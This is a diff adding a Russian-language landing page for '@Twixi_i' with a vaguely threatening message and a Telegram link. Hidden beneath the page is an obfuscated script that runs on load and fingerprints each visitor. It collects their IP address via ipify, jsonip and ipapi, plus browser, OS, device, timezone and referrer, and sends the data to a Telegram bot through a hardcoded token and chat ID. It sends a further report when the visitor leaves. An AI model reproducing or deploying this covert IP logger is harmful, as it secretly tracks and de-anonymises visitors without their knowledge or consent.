@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>@Twixi_i</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            overflow-x: hidden;
+        }
+        
+        .bg-image {
+            width: 100vw;
+            min-height: 1500vh;
+            background-image: url('background.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(8px);
+            z-index: 1;
+            pointer-events: none;
+        }
+        
+        .content {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 2;
+            width: 100%;
+            padding: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: white;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.8);
+            margin-bottom: 20px;
+        }
+
+        /* Telegram Button */
+        .telegram-btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background-color: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+
+        .telegram-btn:hover {
+            background-color: #006699;
+        }
+
+        .telegram-btn i {
+            margin-right: 8px;
+        }
+
+        /* Footer */
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            z-index: 3;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 12px;
+        }
+
+        footer a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        footer a:hover {
+            color: white;
+        }
+        
+        /* Header */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            z-index: 3;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 16px;
+        }
+
+        .header-content {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .header-content:hover {
+            color: white;
+        }
+        
+        .header-content i {
+            margin-right: 8px;
+            transition: color 0.3s;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            color: white;
+            z-index: 1000;
+            opacity: 0;
+            transform: translateX(100%);
+            transition: opacity 0.3s, transform 0.3s;
+            max-width: 300px;
+            text-align: center;
+        }
+        
+        .success {
+            background-color: #4CAF50;
+        }
+        
+        .error {
+            background-color: #F44336;
+        }
+        
+        .show {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        /* Hidden logger info */
+        .logger-info {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <i class="fas fa-wrench"></i> @Twixi_i
+        </div>
+    </header>
+    <div class="bg-image"></div>
+    <div class="overlay"></div>
+    <div class="content">
+        <h1>@Twixi_i я предлагал по хорошему</h1>
+        <a href="https://t.me/znaniya_Twixi_i" class="telegram-btn" target="_blank">
+            <i class="fab fa-telegram"></i> Telegram
+        </a>
+    </div>
+    
+    <div class="logger-info" id="visitorInfo"></div>
+    
+    <!-- Уведомление -->
+    <div id="notification" class="notification">
+        <i class="fas fa-wrench"></i><span id="notificationText"></span>
+    </div>
+    
+    <footer>
+        &copy; 2025 | @Dewid_Jefferson, @TgZinx, @ERR0R9999K
+    </footer>
+
+	<script>
+		const _0x494553=_0x1cba;(function(_0x22e6d0,_0x1f6d6a){const _0x1cb383=_0x1cba,_0x3710b6=_0x22e6d0();while(!![]){try{const _0x22d213=parseInt(_0x1cb383(0x1ff))/0x1*(parseInt(_0x1cb383(0x1ea))/0x2)+-parseInt(_0x1cb383(0x1dc))/0x3*(-parseInt(_0x1cb383(0x1a7))/0x4)+-parseInt(_0x1cb383(0x1e0))/0x5+-parseInt(_0x1cb383(0x17e))/0x6+-parseInt(_0x1cb383(0x1f1))/0x7+parseInt(_0x1cb383(0x1cf))/0x8+-parseInt(_0x1cb383(0x197))/0x9*(parseInt(_0x1cb383(0x1d3))/0xa);if(_0x22d213===_0x1f6d6a)break;else _0x3710b6['push'](_0x3710b6['shift']());}catch(_0x152434){_0x3710b6['push'](_0x3710b6['shift']());}}}(_0x2218,0x1c0ca));function _0x1cba(_0x143e9b,_0x2191fb){const _0x2218d6=_0x2218();return _0x1cba=function(_0x1cba96,_0x31be83){_0x1cba96=_0x1cba96-0x17d;let _0x115133=_0x2218d6[_0x1cba96];return _0x115133;},_0x1cba(_0x143e9b,_0x2191fb);}const BOT_TOKEN=_0x494553(0x1a2),CHAT_ID=_0x494553(0x1fa);async function getIP(){const _0x25866c=_0x494553,_0x15ef87=['https://api.ipify.org?format=json',_0x25866c(0x1b9),_0x25866c(0x18a)];for(const _0x136f15 of _0x15ef87){try{const _0x71c32=await fetch(_0x136f15,{'timeout':0x1388});if(!_0x71c32['ok'])continue;const _0x1f66a8=await _0x71c32[_0x25866c(0x1fc)]();return _0x1f66a8['ip']||_0x1f66a8[_0x25866c(0x1fd)]||_0x25866c(0x1d5);}catch(_0x93084e){console[_0x25866c(0x18f)]('Сервис\x20'+_0x136f15+'\x20не\x20сработал:\x20'+_0x93084e);continue;}}return _0x25866c(0x1d5);}function detectBrowser(){const _0x102ad7=_0x494553,_0x52c9e7=navigator[_0x102ad7(0x190)];if(_0x52c9e7['includes']('Firefox'))return _0x102ad7(0x1c1);if(_0x52c9e7[_0x102ad7(0x1f0)](_0x102ad7(0x1e1)))return'Microsoft\x20Edge\x20🪟';if(_0x52c9e7['includes'](_0x102ad7(0x1c8)))return _0x102ad7(0x1c4);if(_0x52c9e7[_0x102ad7(0x1f0)](_0x102ad7(0x1e8)))return'Apple\x20Safari\x20🍎';if(_0x52c9e7[_0x102ad7(0x1f0)]('Opera'))return _0x102ad7(0x19f);return _0x102ad7(0x1f3);}function detectOS(){const _0x3e35ce=_0x494553,_0x237257=navigator[_0x3e35ce(0x190)];if(_0x237257['includes'](_0x3e35ce(0x1d7)))return _0x3e35ce(0x19a);if(_0x237257[_0x3e35ce(0x1f0)]('Mac'))return _0x3e35ce(0x1b8);if(_0x237257[_0x3e35ce(0x1f0)](_0x3e35ce(0x19e)))return _0x3e35ce(0x200);if(_0x237257[_0x3e35ce(0x1f0)]('Android'))return _0x3e35ce(0x1ca);if(_0x237257[_0x3e35ce(0x1f0)](_0x3e35ce(0x1ac)))return _0x3e35ce(0x19d);return _0x3e35ce(0x1fb);}function getDeviceType(){const _0x106df2=_0x494553,_0x4da853=navigator[_0x106df2(0x190)];if(_0x4da853[_0x106df2(0x1f0)](_0x106df2(0x1ba)))return _0x106df2(0x19c);if(_0x4da853[_0x106df2(0x1f0)](_0x106df2(0x1c6)))return _0x106df2(0x1de);return _0x106df2(0x1e6);}function checkTouchSupport(){const _0xeb9793=_0x494553;return _0xeb9793(0x1e3)in window||navigator[_0xeb9793(0x1b0)]>0x0?'Поддерживается\x20👆':_0xeb9793(0x1f6);}function getConnectionInfo(){const _0x3a0ef5=_0x494553;if('connection'in navigator){const _0x405719=navigator[_0x3a0ef5(0x1b6)];let _0x1b0c8d=_0x3a0ef5(0x1c9);if(_0x405719[_0x3a0ef5(0x180)]&&_0x405719[_0x3a0ef5(0x180)]!==Infinity)_0x1b0c8d=_0x405719[_0x3a0ef5(0x180)]+_0x3a0ef5(0x1ce);else _0x405719[_0x3a0ef5(0x1f2)]&&_0x405719[_0x3a0ef5(0x1f2)]!==Infinity&&(_0x1b0c8d=_0x405719[_0x3a0ef5(0x1f2)]+_0x3a0ef5(0x1ce));return{'type':_0x405719[_0x3a0ef5(0x1b7)]||_0x3a0ef5(0x1c9),'speed':_0x1b0c8d};}return{'type':'Информация\x20недоступна\x20❌','speed':_0x3a0ef5(0x1b3)};}async function collectVisitorData(){const _0xe6dc5f=_0x494553,_0x2dc27c=getConnectionInfo(),_0x4411df=await getIP();return{'timestamp':new Date()[_0xe6dc5f(0x1e4)](_0xe6dc5f(0x1bf)),'url':window[_0xe6dc5f(0x1ee)][_0xe6dc5f(0x1df)],'referrer':document[_0xe6dc5f(0x1f4)]||_0xe6dc5f(0x1d0),'userAgent':navigator[_0xe6dc5f(0x190)],'language':navigator[_0xe6dc5f(0x191)],'platform':navigator[_0xe6dc5f(0x1a4)],'screen':screen['width']+'x'+screen[_0xe6dc5f(0x18c)],'viewport':window['innerWidth']+'x'+window[_0xe6dc5f(0x198)],'timezone':Intl[_0xe6dc5f(0x18d)]()[_0xe6dc5f(0x1b4)]()[_0xe6dc5f(0x188)],'cookies':navigator[_0xe6dc5f(0x1bd)]?'Включены\x20✅':_0xe6dc5f(0x1db),'javaEnabled':navigator[_0xe6dc5f(0x1cb)]?_0xe6dc5f(0x17d):_0xe6dc5f(0x1d9),'deviceMemory':navigator[_0xe6dc5f(0x1a5)]||_0xe6dc5f(0x1a1),'connection':_0x2dc27c[_0xe6dc5f(0x187)],'connectionSpeed':_0x2dc27c['speed'],'ip':_0x4411df,'browser':detectBrowser(),'os':detectOS(),'deviceType':getDeviceType(),'touchSupport':checkTouchSupport(),'orientation':screen[_0xe6dc5f(0x1f7)]?screen[_0xe6dc5f(0x1f7)][_0xe6dc5f(0x187)]:window['orientation']?window[_0xe6dc5f(0x1f7)]===0x0?_0xe6dc5f(0x199):'Альбомная\x20📱':_0xe6dc5f(0x1c9),'pixelRatio':window[_0xe6dc5f(0x17f)]||_0xe6dc5f(0x1a1)};}function _0x2218(){const _0x1758b1=['touchSupport','📡\x20<b>СЕТЕВАЯ\x20ИНФОРМАЦИЯ</b>%0A','add','type','timeZone','getElementById','https://jsonip.com/','timing','height','DateTimeFormat','notification\x20','log','userAgent','language','⏱️\x20<b>Провел\x20времени:</b>\x20','Ошибка\x20сети:','🔔\x20<i>Данные\x20собраны\x20системой\x20отслеживания</i>','├\x20📱\x20<b>Устройство:</b>\x20','🔗\x20<b>Страница:</b>\x20','12249NwEuSd','innerHeight','Портретная\x20📱','Windows\x20🪟','├\x20🌐\x20<b>Браузер:</b>\x20','Мобильное\x20устройство\x20📱','iOS\x20🍎','Linux','Opera\x20🎭','browser','Недоступно\x20❌','8262152149:AAH2t6xdaVzHLgeho8QT_Ph0hPN7PZ1HXNk','then','platform','deviceMemory','└\x20👆\x20<b>Сенсорный\x20экран:</b>\x20','365024hnfuyz','├\x20🚀\x20<b>Скорость:</b>\x20','Ошибка\x20сети\x20❌','notificationText','classList','iOS','screen','pixelRatio','textContent','maxTouchPoints','├\x20🍪\x20<b>Cookies:</b>\x20','error','Информация\x20недоступна\x20❌','resolvedOptions','├\x20📐\x20<b>Ориентация:</b>\x20','connection','effectiveType','Mac\x20OS\x20🍎','https://ipapi.co/json/','Mobile','<code>','</code>%0A','cookieEnabled','├\x20🔗\x20<b>Страница:</b>\x20','ru-RU','success','Mozilla\x20Firefox\x20🦊','\x20секунд%0A','stringify','Google\x20Chrome\x20🪟','Не\x20настроен\x20BOT_TOKEN\x20или\x20CHAT_ID','Tablet','deviceType','Chrome','Неизвестно\x20❓','Android\x20🤖','javaEnabled','round','⏰\x20<b>Время\x20визита:</b>\x20','\x20Мбит/с\x20🚀','1814616GerpJf','Прямой\x20заход','├\x20💻\x20<b>ОС:</b>\x20','url','270CgGIUK','└\x20☕\x20<b>Java:</b>\x20','Не\x20удалось\x20определить\x20❌','\x20Спасибо\x20за\x20посещение\x20сайта!','Windows','%0A%0A','Нет\x20❌','%0A','Выключены\x20❌','3oWrXXk','&parse_mode=HTML','Планшет\x20📱','href','742625fQmYOZ','Edg','├\x20📏\x20<b>Разрешение:</b>\x20','ontouchstart','toLocaleString','├\x20📊\x20<b>Плотность\x20пикселей:</b>\x20','Десктоп\x20💻','\x20GB%0A','Safari','https://api.telegram.org/bot','2xNxEsY','DOMContentLoaded','Ошибка:','🛰️\x20<b>НОВЫЙ\x20ПОСЕТИТЕЛЬ\x20НА\x20САЙТЕ</b>%0A%0A','location','├\x20📶\x20<b>Тип\x20соединения:</b>\x20','includes','1153859qfXLLC','downlinkMax','Неизвестный\x20браузер\x20❓','referrer','├\x20🗣️\x20<b>Язык:</b>\x20','Не\x20поддерживается\x20❌','orientation','Ошибка❌','timestamp','5163519096','Неизвестная\x20ОС\x20❓','json','ipAddress','</code>%0A%0A','192947gfNUwu','Linux\x20🐧','🌐\x20<b>ОСНОВНАЯ\x20ИНФОРМАЦИЯ</b>%0A','catch','Да\x20✅','276186fKiyzl','devicePixelRatio','downlink','show','className','🚪\x20<b>ПОЛЬЗОВАТЕЛЬ\x20УШЕЛ\x20СО\x20СТРАНИЦЫ</b>%0A%0A'];_0x2218=function(){return _0x1758b1;};return _0x2218();}function formatMessage(_0x5f137a){const _0x434fbe=_0x494553;let _0x3bc576=_0x434fbe(0x1ed);return _0x3bc576+=_0x434fbe(0x1cd)+_0x5f137a[_0x434fbe(0x1f9)]+_0x434fbe(0x1d8),_0x3bc576+=_0x434fbe(0x201),_0x3bc576+='├\x20🔍\x20<b>IP-адрес:</b>\x20<code>'+_0x5f137a['ip']+_0x434fbe(0x1bc),_0x3bc576+=_0x434fbe(0x19b)+_0x5f137a[_0x434fbe(0x1a0)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1d1)+_0x5f137a['os']+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1e2)+_0x5f137a[_0x434fbe(0x1ad)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x195)+_0x5f137a[_0x434fbe(0x1c7)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1f5)+_0x5f137a[_0x434fbe(0x191)]+'%0A',_0x3bc576+='├\x20⏰\x20<b>Часовой\x20пояс:</b>\x20'+_0x5f137a['timezone']+'%0A',_0x3bc576+=_0x434fbe(0x1b1)+_0x5f137a['cookies']+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1d4)+_0x5f137a[_0x434fbe(0x1cb)]+'%0A%0A',_0x3bc576+=_0x434fbe(0x185),_0x3bc576+=_0x434fbe(0x1ef)+_0x5f137a[_0x434fbe(0x1b6)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1a8)+_0x5f137a['connectionSpeed']+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1be)+_0x5f137a[_0x434fbe(0x1d2)]+_0x434fbe(0x1da),_0x3bc576+='└\x20↪️\x20<b>Источник:</b>\x20'+_0x5f137a[_0x434fbe(0x1f4)]+_0x434fbe(0x1d8),_0x3bc576+='📱\x20<b>УСТРОЙСТВО</b>%0A',_0x3bc576+='├\x20🖥️\x20<b>Разрешение\x20экрана:</b>\x20'+_0x5f137a[_0x434fbe(0x1ad)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1e5)+_0x5f137a[_0x434fbe(0x1ae)]+_0x434fbe(0x1da),_0x3bc576+=_0x434fbe(0x1b5)+_0x5f137a[_0x434fbe(0x1f7)]+_0x434fbe(0x1da),_0x3bc576+='├\x20📟\x20<b>Тип\x20устройства:</b>\x20'+_0x5f137a['deviceType']+_0x434fbe(0x1da),_0x3bc576+='├\x20💾\x20<b>Память:</b>\x20'+_0x5f137a[_0x434fbe(0x1a5)]+_0x434fbe(0x1e7),_0x3bc576+=_0x434fbe(0x1a6)+_0x5f137a[_0x434fbe(0x184)]+_0x434fbe(0x1d8),_0x3bc576+='🔍\x20<b>USER\x20AGENT</b>%0A',_0x3bc576+=_0x434fbe(0x1bb)+_0x5f137a['userAgent']+_0x434fbe(0x1fe),_0x3bc576+=_0x434fbe(0x194),_0x3bc576;}function sendToTelegram(_0x99973d){const _0x3c65f1=_0x494553;if(!BOT_TOKEN||!CHAT_ID){console['error'](_0x3c65f1(0x1c5));return;}const _0x66992a=_0x3c65f1(0x1e9)+BOT_TOKEN+'/sendMessage?chat_id='+CHAT_ID+'&text='+_0x99973d+_0x3c65f1(0x1dd);fetch(_0x66992a)[_0x3c65f1(0x1a3)](_0x19dbad=>_0x19dbad[_0x3c65f1(0x1fc)]())[_0x3c65f1(0x1a3)](_0x1806f7=>{const _0x3f367c=_0x3c65f1;_0x1806f7['ok']?(console['log']('Спасибо\x20за\x20посещение\x20сайта!'),showNotification(_0x3f367c(0x1d6),_0x3f367c(0x1c0))):(console[_0x3f367c(0x1b2)](_0x3f367c(0x1ec),_0x1806f7),showNotification(_0x3f367c(0x1f8),_0x3f367c(0x1b2)));})[_0x3c65f1(0x202)](_0x1a0dac=>{const _0x1955ca=_0x3c65f1;console[_0x1955ca(0x1b2)](_0x1955ca(0x193),_0x1a0dac),showNotification(_0x1955ca(0x1a9),_0x1955ca(0x1b2));});}function showNotification(_0x99df2a,_0x43d9a8){const _0x503fa2=_0x494553,_0x588865=document[_0x503fa2(0x189)]('notification'),_0x7a0387=document[_0x503fa2(0x189)](_0x503fa2(0x1aa));_0x7a0387[_0x503fa2(0x1af)]=_0x99df2a,_0x588865[_0x503fa2(0x182)]=_0x503fa2(0x18e)+_0x43d9a8,_0x588865[_0x503fa2(0x1ab)][_0x503fa2(0x186)]('show'),setTimeout(()=>{const _0x2c0fec=_0x503fa2;_0x588865[_0x2c0fec(0x1ab)]['remove'](_0x2c0fec(0x181));},0xbb8);}document['addEventListener'](_0x494553(0x1eb),async function(){setTimeout(async()=>{const _0x51af1e=_0x1cba;try{const _0x4f5102=await collectVisitorData(),_0x285c28=formatMessage(_0x4f5102);sendToTelegram(_0x285c28),document['getElementById']('visitorInfo')['textContent']=JSON[_0x51af1e(0x1c3)](_0x4f5102,null,0x2);}catch(_0x5d5ae8){console['error']('Ошибка:',_0x5d5ae8),showNotification(_0x51af1e(0x1f8),'error');}},0x7d0);}),window['addEventListener']('beforeunload',function(){const _0x178336=_0x494553,_0x3f17c8=Math[_0x178336(0x1cc)]((Date['now']()-performance[_0x178336(0x18b)]['navigationStart'])/0x3e8),_0x4a0159=_0x178336(0x183)+(_0x178336(0x192)+_0x3f17c8+_0x178336(0x1c2))+(_0x178336(0x196)+window[_0x178336(0x1ee)][_0x178336(0x1df)]+'%0A%0A')+('🕐\x20<b>Время\x20ухода:</b>\x20'+new Date()[_0x178336(0x1e4)](_0x178336(0x1bf)));sendToTelegram(_0x4a0159);});
+    </script>
+</body>
+</html>
